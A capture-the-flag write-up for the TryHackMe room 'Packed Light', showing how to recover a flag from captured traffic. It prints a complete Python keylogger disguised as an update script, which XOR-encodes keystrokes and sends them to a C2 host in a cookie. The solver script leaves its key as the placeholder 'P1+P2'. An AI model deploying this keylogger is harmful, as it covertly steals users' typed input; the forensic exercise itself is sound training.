<p align="center">
  <img src="https://tryhackme.com/_next/image?url=https%3A%2F%2Fcdn-images.tryhackme.com%2Froom-icons%2F5dbea226085ab6182a2ee0f7-1785251388851&w=96&q=75">
</p>

# Packed Light


## STEP 01

- Download the Packet file
- Open `pcap` file using [**Wireshark**](https://www.wireshark.org/download.html)
- Then go to `File> Export object`
- Then `HTTP`
- Then save `Update.py`

## STEP 02

- Update.py contains this code
  ```
  import requests
  import base64
  from pynput import keyboard
  
  C2_URL = "http://byte-lotus-hotel.thm:8080/"
  
  def getkey():
      p1 = "H0t3lSt@ff0Nly"
      p2 = "K3epS3cr3t!"
      return p1 + p2
  
  def xor(data: bytes, key: bytes) -> bytes:
      return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
  
  def sendltr(character):
      raw_bytes = character.encode('utf-8')
      encrypted = xor(raw_bytes, getkey().encode('utf-8'))
      
      b64_string = base64.b64encode(encrypted).decode('utf-8')
      
      headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
          "Cookie": f"hotel_sess_state={b64_string}"
      }    
      try:
          requests.get(C2_URL, headers=headers, timeout=0.5)
      except:
          pass
  
  def on_press(key):
      try:
          sendltr(key.char)
      except AttributeError:
          if key == keyboard.Key.space:
              sendltr(" ")
          elif key == keyboard.Key.enter:
              sendltr("\n")
  
  print("[*] Byte Lotus Sync Service started...")
  with keyboard.Listener(on_press=on_press) as listener:
      listener.join()

  ```
- Then solve the `P1+P2`
  ```
  H0t3lSt@ff0NlyK3epS3cr3t!
  ```
- Try this filter in `Wireshark`
  ```
  tcp.port == 8080
  ```
- Open packets and find the packet destination `192.168.1.141`
- Then you will find the cookies base64 `hotel_sess_state=BQ==`

## FINAL STEP

- create file `solver.py` and run
  ```
  #!/usr/bin/env python3

  from scapy.all import rdpcap, Raw
  import re
  import base64
  import urllib.parse
  
  
  KEY = b"P1+P2"
  
  
  def xor_decrypt(data, key):
      return bytes(
          b ^ key[i % len(key)]
          for i, b in enumerate(data)
      )
  
  
  pcap_file = "traffic.pcapng"
  
  
  print("[+] Reading PCAP...")
  packets = rdpcap(pcap_file)
  
  
  cookies = []
  
  
  print("[+] Extracting cookies...")
  
  
  for packet in packets:
  
      if packet.haslayer(Raw):
  
          payload = packet[Raw].load.decode(errors="ignore")
  
          matches = re.findall(
              r"hotel_sess_state=([^;\s\r\n]+)",
              payload
          )
  
          for c in matches:
              cookies.append(c)
  
  
  print(f"[+] Found {len(cookies)} cookies")
  
  
  flag = ""
  
  
  print("[+] Decoding each cookie...")
  
  
  for index, cookie in enumerate(cookies):
  
      try:
  
          # Remove URL encoding
          cookie = urllib.parse.unquote(cookie)
  
          # Base64 decode
          encrypted = base64.b64decode(cookie)
  
          # XOR decrypt
          decrypted = xor_decrypt(encrypted, KEY)
  
          text = decrypted.decode(
              "utf-8",
              errors="ignore"
          )
  
          print(f"{index}: {repr(text)}")
  
          flag += text
  
  
      except Exception as e:
          print(f"[-] Cookie {index} failed: {e}")
  
  
  print("\n========== FLAG ==========")
  print(flag)
  print("==========================")
  ```

## Solver print the  **FLAG** 🚩

# Congratulations on your Exploration 🎉
